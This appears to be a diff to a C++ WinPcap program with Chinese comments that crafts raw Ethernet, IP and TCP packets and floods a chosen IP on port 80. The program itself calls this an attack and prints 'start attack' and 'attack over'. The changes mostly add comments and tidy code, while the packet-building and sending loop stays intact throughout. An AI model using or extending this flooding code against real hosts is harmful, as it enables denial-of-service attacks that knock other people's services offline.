@@ -20,7 +20,7 @@ pcap_if_t* getDevs(void)
 
 	return alldevs;
 }
-
+//通过输入数字找到选择设备
 pcap_if_t* getDev(int i, pcap_if_t* alldevs)
 {
 	pcap_if_t *d = nullptr;
@@ -31,7 +31,7 @@ pcap_if_t* getDev(int i, pcap_if_t* alldevs)
 	}
 	return d;
 }
-
+//验证ip格式
 bool isValidIP(std::string ip) {
 	std::string delim = ".";
 	std::string ret[4];
@@ -75,14 +75,12 @@ void sig_handler(int sig)
 	{
 		keepRunning = 0;
 		std::cout << "攻击结束\n" << "\n";
-		/* 不再需要设备列表了，释放它 */
 	}
 }
 
 int main(int args,char* argv[])
 {
 	signal(SIGINT, sig_handler);//注册信号处理CTRL+C
-	//getMacbyIp("192.168.31.193");
 	
 	int choose = -1;//选择网卡
 	pcap_if_t *alldevs = getDevs();
@@ -99,7 +97,7 @@ int main(int args,char* argv[])
 
 	if (i == 0)
 	{
-		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
+		printf("\n没有找到可用的网卡\n");
 		return 0;
 	}
 
@@ -107,7 +105,7 @@ int main(int args,char* argv[])
 	while (true)
 	{
 		std::cin >> choose;
-		if (choose > i)
+		if (choose > i || choose < 1)
 		{
 			std::cout << "超出选择范围了！\n"
 				<< "请在 " << i << " 以内选择" << std::endl;
@@ -138,20 +136,20 @@ int main(int args,char* argv[])
 	std::cout << "开始攻击\n" << ip << "\n";
 
 	simpleDD(ip, dd->name);
-	//std::cout << "攻击结束\n" << ip << "\n";
+
 	/* 不再需要设备列表了，释放它 */
 	pcap_freealldevs(alldevs);
 	system("pause");
 	return 0;
 }
-
+//攻击func
 void simpleDD(std::string ip,char* devName)
 {
-	int port = 80;
+	const char * MYIP = "192.168.31.216";
+	int port = 80;//攻击目标端口
 	int SendSEQ = 0;
 	unsigned long FakeIpNet, FakeIpHost;
 
-	const char* MYIP = "192.168.31.216";
 	_EthHeader ethHeader;//物理帧头部
 	IpHeader ipHeader;//IP头部
 	_TcpHeader tcpHeader;//TCP头部
@@ -159,20 +157,15 @@ void simpleDD(std::string ip,char* devName)
 
 	unsigned char  temp[6] = { 0 };
 	
-	getMacbyIp(ip,temp);
-	//char strMacAddr[100] = { 0 };
-	//sprintf(strMacAddr, "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x\n", temp[0], temp[1], temp[2], temp[3], temp[4], temp[5]);
-	//printf(strMacAddr);
 	
+	getMacbyIp(ip,temp);//获取目标主机MAC地址 
 	//unsigned char temp[6] = { 0xc4,0xca,0xd9,0xde,0xdc,0xf3 };
-	
 	memcpy(ethHeader.dMac, temp, 6);
-
 
 	unsigned char temp2[6] = { 0x68,0xA3,0xC4,0xF2,0x5B,0xFF };
 	memcpy(ethHeader.sMac, temp2, 6);
-	
 	ethHeader.type = 0x0008;
+	
 
 	FakeIpNet = inet_addr(ip.c_str());
 	FakeIpHost = ntohl(FakeIpNet);
@@ -243,6 +236,7 @@ void simpleDD(std::string ip,char* devName)
 
 		memset(buf, 0, dataSize);
 
+		//填充数据包 头部 ethHeader ipHeader tcpHeader
 		int len = 0;
 		memcpy(buf, &ethHeader, sizeof(ethHeader));
 		len += sizeof(ethHeader);
@@ -250,18 +244,22 @@ void simpleDD(std::string ip,char* devName)
 		len += sizeof(ipHeader);
 		memcpy(buf + len, &tcpHeader, sizeof(tcpHeader));
 		len += sizeof(tcpHeader);
-		//pcap_if_t* alldevs;
+
+
 		char err[1000];
-		//pcap_findalldevs(&alldevs, err);
-		//const char* name = "\\Device\\NPF_{031DE55D-6B02-4407-829C-F8B813A9AA18}";
 		pcap_t * fp;
-		fp = pcap_open(devName, 100, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, err);
-		pcap_sendpacket(fp, buf, len);
+		fp = pcap_open(devName, 100, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, err);//通过设备name打开设备
+		pcap_sendpacket(fp, buf, len);//发送数据包
 		pcap_close(fp);
 		InterlockedExchangeAdd((long *)&threadnum, -1);
 	}
 }
-void getMacbyIp(std::string ip,unsigned char  (&mac)[6] )
+
+
+/*
+通过发送arp包 通过IP获取目标主机MAC地址 用来填充以太头
+*/
+void getMacbyIp(std::string ip,unsigned char  (&mac)[6]/*传递数组地址*/ )
 {
 	HRESULT hr;
 	IPAddr  ipAddr;
@@ -271,7 +269,9 @@ void getMacbyIp(std::string ip,unsigned char  (&mac)[6] )
 	ipAddr = inet_addr(ip.c_str());
 	memset(pulMac, 0xff, sizeof(pulMac));
 	ulLen = 6;
-	hr = SendARP(ipAddr, 0, pulMac, &ulLen);
+
+	hr = SendARP(ipAddr, 0, pulMac, &ulLen);//发送arp包
+
 	if (hr != NO_ERROR)
 	{
 		printf("目标主机不在线!");
@@ -281,9 +281,5 @@ void getMacbyIp(std::string ip,unsigned char  (&mac)[6] )
 	memcpy(mac, pulMac, sizeof mac);
 	
 	sprintf(strMacAddr, "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-
-
 	printf(strMacAddr);
-
-
 }
